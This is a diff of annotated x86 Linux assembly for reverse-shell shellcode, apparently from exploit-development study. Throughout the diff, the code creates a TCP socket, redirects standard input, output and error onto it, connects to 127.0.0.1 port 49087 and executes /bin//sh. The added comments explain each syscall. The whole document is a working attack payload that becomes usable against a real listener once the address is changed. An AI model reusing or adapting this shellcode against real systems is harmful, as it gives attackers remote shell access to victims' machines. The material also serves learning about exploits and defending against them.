@@ -31,49 +31,52 @@ GLOBAL _start
 
 _start:
 	xor  ebx, ebx
+	mul  ebx
 
 socket:
-	push ebx
-	inc  ebx
-	push ebx
-	push byte 0x2
-	push byte 0x66
-	pop  eax
-	mov  ecx, esp
+	push ebx              ; protocol = 0 = first that matches this type and domain, i.e. tcp
+	inc  ebx              ; 1 = SYS_SOCKET
+	push ebx              ; type     = 1 = SOCK_STREAM
+	push byte 0x2         ; domain   = 2 = AF_INET
+	mov  ecx, esp         ; socketcall args
+	mov  al, 0x66
 	int  0x80
 	xchg eax, ebx
 
+; int dup2(int oldfd, int newfd);
 dup:
-	pop  ecx
+	pop  ecx              ; oldfd = 2, aka stderr
+	; newfd is in ebx, set above, and doesn't change until we're ready to call
+	; connect(2)
 dup_loop:
-	mov  al, 0x3f
+	mov  al, 0x3f         ; __NR_dup2
 	int  0x80
 	dec  ecx
 	jns  dup_loop
 
+; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 connect:
-	pop  ebx
-	pop  edx
-	push dword 0x0100007f
-	push word 0xbfbf
-	inc  ebx
-	push bx
-	mov  ecx, esp
-	mov  al, 0x66
-	push eax
-	push ecx
-	push ebx
-	mov  ecx, esp
-	inc  ebx
+	push dword 0x0100007f ; addr->sin_addr = 127.0.0.1
+	push 0xbfbf0002       ; addr->sin_port = 49087
+	                      ; addr->sin_family = 2 = AF_INET
+	mov  ecx, esp         ; ecx = addr
+	mov  al, 0x66         ; __NR_socketcall
+	push eax              ; addrlen
+	push ecx              ; addr
+	push ebx              ; sockfd
+	mov  bl, 0x3          ; 3 = SYS_CONNECT
+	mov  ecx, esp         ; socketcall args
 	int  0x80
 
+; int execve(const char *filename, char *const argv[], char *const envp[]);
 execve:
-	push edx
+	push edx              ; NULL terminator for "/bin//sh"
 	push dword 0x68732f2f
 	push dword 0x6e69622f
-	mov  ebx, esp
-	push edx
-	push ebx
-	mov  ecx, esp
-	mov  al, 0x0b
+	mov  ebx, esp         ; filename
+	push edx              ; NULL terminator for argv
+	push ebx              ; pointer to "/bin//sh"
+	mov  ecx, esp         ; argv = pointer to pointer to "/bin//sh"
+	mov  al, 0x0b         ; __NR_execve
 	int  0x80
+
